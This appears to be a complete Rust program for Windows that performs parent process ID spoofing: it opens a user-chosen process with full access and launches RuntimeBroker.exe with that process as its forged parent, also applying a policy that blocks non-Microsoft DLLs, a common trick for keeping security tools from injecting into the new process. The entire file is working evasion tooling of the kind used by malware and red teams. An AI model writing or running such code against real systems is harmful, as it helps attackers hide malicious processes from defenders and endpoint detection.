use std::ffi::CString;
use std::io::Read;
use std::ptr::{null, null_mut};

use winapi::ctypes::c_void;
use winapi::um::errhandlingapi::GetLastError;
use winapi::um::handleapi::CloseHandle;
use winapi::um::heapapi::{GetProcessHeap, HeapAlloc};
use winapi::um::processenv::GetEnvironmentVariableA;
use winapi::um::processthreadsapi::{
    CreateProcessA, DeleteProcThreadAttributeList, InitializeProcThreadAttributeList, OpenProcess,
    PROC_THREAD_ATTRIBUTE_LIST, PROCESS_INFORMATION, UpdateProcThreadAttribute,
};

use winapi::um::winbase::{EXTENDED_STARTUPINFO_PRESENT, STARTUPINFOEXA};
use winapi::um::winnt::{HANDLE, PROCESS_ALL_ACCESS};

const TARGET_PROCESS: &str = "RuntimeBroker.exe -Embedding";
const MAX_PATH: u32 = 260;

pub const PROC_THREAD_ATTRIBUTE_PARENT_PROCESS: usize = 131072usize;

pub const PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY: usize = 131079usize;

pub const PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON: u64 = 1 << 44;

fn create_ppid_spoofing_process(
    parent_process: *mut c_void,
    process_name: &str,
    process_id: &mut u32,
    process_handle: &mut *mut c_void,
    thread_handle: &mut *mut c_void,
) -> Result<(), String> {
    let mut path = vec![0u8; 260 * 2];
    let mut current_dir = vec![0u8; 260];
    let mut windir = vec![0u8; 260];

    unsafe {
        let mut startup_info: STARTUPINFOEXA = std::mem::zeroed();
        let mut process_info: PROCESS_INFORMATION = std::mem::zeroed();

        startup_info.StartupInfo.cb = std::mem::size_of::<STARTUPINFOEXA>() as u32;

        let windir_str = CString::new("WINDIR").unwrap();


        if GetEnvironmentVariableA(
            windir_str.as_ptr(),
            windir.as_mut_ptr() as *mut i8,
            MAX_PATH
        ) == 0
        {
            return Err(format!(
                "GetEnvironmentVariableA failed: {}",
                GetLastError()
            ));
        }

        // Create process path and current directory
        let windir_str = String::from_utf8_lossy(
            &windir[..windir.iter().position(|&x| x == 0).unwrap_or(windir.len())],
        );
        let path_str = format!("{}\\System32\\{}", windir_str, process_name);
        let dir_str = format!("{}\\System32\\", windir_str);

        path[..path_str.len()].copy_from_slice(path_str.as_bytes());
        current_dir[..dir_str.len()].copy_from_slice(dir_str.as_bytes());

        let mut attr_size = 0;
        InitializeProcThreadAttributeList(null_mut(), 2, 0, &mut attr_size);

        let attr_list =
            HeapAlloc(GetProcessHeap(), 0, attr_size) as *mut PROC_THREAD_ATTRIBUTE_LIST;

        if attr_list.is_null() {
            return Err(format!("HeapAlloc failed: {}", GetLastError()));
        }

        if InitializeProcThreadAttributeList(attr_list, 2, 0, &mut attr_size) == 0 {
            return Err(format!(
                "InitializeProcThreadAttributeList failed: {}",
                GetLastError()
            ));
        }

        if UpdateProcThreadAttribute(
            attr_list,
            0,
            PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, // 131072u32
            &parent_process as *const _ as *mut _,
            std::mem::size_of::<HANDLE>(),
            null_mut(),
            null_mut(),
        ) == 0
        {
            return Err(format!(
                "UpdateProcThreadAttribute failed: {}",
                GetLastError()
            ));
        }

        // Attribute 2: Mitigation Policy (e.g. block non-Microsoft DLLs)
        let mitigation_policy: u64 = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;

        if UpdateProcThreadAttribute(
            attr_list,
            0,
            PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY,  // 0x00020007
            &mitigation_policy as *const _ as *mut _,
            std::mem::size_of::<u64>(),
            null_mut(),
            null_mut(),
        ) == 0 {
            DeleteProcThreadAttributeList(attr_list);
            println!("[!] UpdateProcThreadAttribute [2] failed: {}", GetLastError());

        }
        startup_info.lpAttributeList = attr_list;

        println!("Running: \"{}\" ... ", path_str);

        let path_cstr = CString::new(path_str).unwrap();
        let dir_cstr = CString::new(dir_str).unwrap();

        if CreateProcessA(
            null(),
            path_cstr.as_ptr() as *mut i8,
            null_mut(),
            null_mut(),
            0,
            EXTENDED_STARTUPINFO_PRESENT,
            null_mut(),
            dir_cstr.as_ptr() as *mut i8,
            &mut startup_info.StartupInfo,
            &mut process_info,
        ) == 0
        {
            DeleteProcThreadAttributeList(attr_list);
            return Err(format!("CreateProcessA failed: {}", GetLastError()));
        }

        println!("DONE");

        // set the output parameters

        *process_id = process_info.dwProcessId;
        *process_handle = process_info.hProcess;
        *thread_handle = process_info.hThread;

        DeleteProcThreadAttributeList(attr_list);
        CloseHandle(parent_process);

        if *process_id != 0 && !process_handle.is_null() && !thread_handle.is_null() {
            Ok(())
        } else {
            Err("Process creation failed: invalid handles or PID".to_string())
        }
    }
}

fn main() -> Result<(), Box<dyn std::error::Error>> {
    let args: Vec<String> = std::env::args().collect();

    if args.len() < 2 {
        return Err("Missing 'Parent Process Id' argument".into());
    }

    let parent_pid: u32 = args[1].parse()?;
    let mut process_id = 0;
    let mut process_handle = null_mut();
    let mut thread_handle = null_mut();

    unsafe {
        let parent_process = OpenProcess(PROCESS_ALL_ACCESS, 0, parent_pid);

        if parent_process.is_null() {
            return Err(format!("OpenProcess failed: {}", GetLastError()).into());
        }

        println!(
            "Spawning Target Process \"{}\" With Parent: {}",
            TARGET_PROCESS, parent_pid
        );

        create_ppid_spoofing_process(
            parent_process,
            TARGET_PROCESS,
            &mut process_id,
            &mut process_handle,
            &mut thread_handle,
        )?;

        println!("Target Process Created With Pid: {}", process_id);

        println!("Press Enter to quit...");

        let _ = std::io::stdin().read(&mut [0u8; 1])?;

        CloseHandle(process_handle);
        CloseHandle(thread_handle);
    }

    Ok(())
}
